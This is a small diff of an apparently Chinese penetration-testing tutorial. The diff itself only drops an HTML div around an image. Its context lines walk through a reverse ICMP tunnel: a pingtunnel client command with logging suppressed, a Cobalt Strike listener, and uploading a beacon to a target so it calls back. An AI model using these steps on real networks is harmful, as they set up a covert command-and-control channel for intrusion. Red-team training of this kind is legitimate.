@@ -229,7 +229,7 @@
 2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1</span><br><span class="line"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span><br></pre></td></tr></table></figure>
 3.cobaltstrike创建listener
-<div align="center">![Intranet-penetration/create_https_proxy_listener.png](Intranet-penetration/create_https_proxy_listener.png)</div>
+![Intranet-penetration/create_https_proxy_listener.png](Intranet-penetration/create_https_proxy_listener.png)
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 这里的代理可以是socks或者http</span><br><span class="line"># 好像cobaltstrike不支持socks5代理，这里并不能成功上线</span><br><span class="line"># 这里也可以使用http代理，不过需要工具将http代理转为socks5代理，比如privoxy</span><br></pre></td></tr></table></figure>
 4.选择创建的listener生成beacon上传到目标执行即可上线
 
